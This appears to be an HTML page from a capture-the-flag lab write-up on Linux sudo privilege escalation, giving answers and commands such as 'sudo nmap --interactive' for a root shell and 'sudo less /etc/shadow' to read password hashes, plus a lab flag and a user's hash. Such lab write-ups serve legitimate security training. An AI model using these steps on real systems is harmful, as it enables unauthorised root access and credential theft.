@@ -1,0 +1,16 @@
+<!doctype html><html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Task 6 - Sudo</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+  
+    <script type="text/javascript">
+        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
+        if (!in_frame()) {
+            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
+            window.location = 'index.html#' + page;
+        }
+    </script>
+</head>
+<body><div class="page"><h1 class="title">Task 6 - Sudo</h1><br/><strong>How many programs can the user "karen" run on the target system with sudo rights?</strong><br /><br />    ‘sudo -l’<br />    <br /><strong>    Answer: 3 (find, less, nano)</strong><br /><br /><strong>What is the content of the flag2.txt file?</strong><br /> <br />    ‘sudo find / -name flag2* 2&gt;/dev/null’<br />    <br />    The flag is in /home/ubuntu, which we have access rights to. <br />    <br />    cat /home/ubuntu/flag2.txt<br />    <br /><strong>    Answer: THM-402028394</strong><br /> <br /> <br /><strong>How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?</strong><br />  <br />    A quick search on GTFObins reveals the answer (<a href="https://gtfobins.github.io/gtfobins/nmap/#sudo">https://gtfobins.github.io/gtfobins/nmap/#sudo</a>)<br />    <br /><strong>    Answer: sudo nmap --interactive  </strong><br />  <br /><strong>  <br />What is the hash of frank's password?</strong><br /><br />    Password hashes are stored in /etc/shadow. Regular users don't have permissions to read that file. However, we are allowed to execute ‘less’ as superuser:<br />    <br />    ‘sudo less /etc/shadow’<br />    <br /><strong>    Answer: $6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1 </strong>   </div></body></html>
